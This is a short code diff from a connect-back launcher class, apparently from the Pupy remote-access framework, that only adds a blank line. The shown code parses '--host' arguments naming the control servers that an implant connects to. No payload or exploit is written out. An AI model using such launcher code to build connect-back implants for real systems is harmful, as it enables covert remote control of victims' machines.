@@ -21,6 +21,7 @@ class ConnectLauncher(BaseLauncher):
     def __init__(self, *args, **kwargs):
         self.connect_on_bind_payload=kwargs.pop("connect_on_bind_payload", False)
         super(ConnectLauncher, self).__init__(*args, **kwargs)
+
     def init_argparse(self):
         self.arg_parser = LauncherArgumentParser(prog="connect", description=self.__doc__)
         self.arg_parser.add_argument('--host', metavar='<host:port>', required=True, action='append', help='host:port of the pupy server to connect to. You can provide multiple --host arguments to attempt to connect to multiple IPs')
